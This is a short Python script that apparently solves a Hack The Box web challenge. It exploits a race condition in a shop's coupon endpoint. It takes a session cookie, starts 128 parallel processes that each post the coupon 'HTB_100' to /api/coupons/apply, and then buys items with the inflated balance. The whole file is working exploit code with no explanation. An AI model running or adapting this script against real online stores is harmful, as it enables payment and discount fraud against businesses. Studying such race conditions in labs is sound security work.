#!/usr/bin/env python

from concurrent.futures import process
from email import header
from multiprocessing import Process, Pool
from threading import Thread
import requests

url = 'http://134.122.104.91:31894'

def race(cookie):
    headers = {
        'Cookie': f'session={cookie}'
    }
    try:
        req = requests.post(url+'/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
        print(req.text)
    except Exception:
        pass


if __name__ == '__main__':
    req = requests.post(url+'/api/purchase', data={'item': 'C8'})
    cookie = req.cookies['session']
    ps = []
    for x in range(128):
        p = Process(target=race, args=(cookie, ))
        ps.append(p)

    for p in ps:
        p.start()

    for p in ps:
        p.join()

    req = requests.post(url+'/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
    print(req.text)
    
    req = requests.post(url+'/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
    print(req.text)
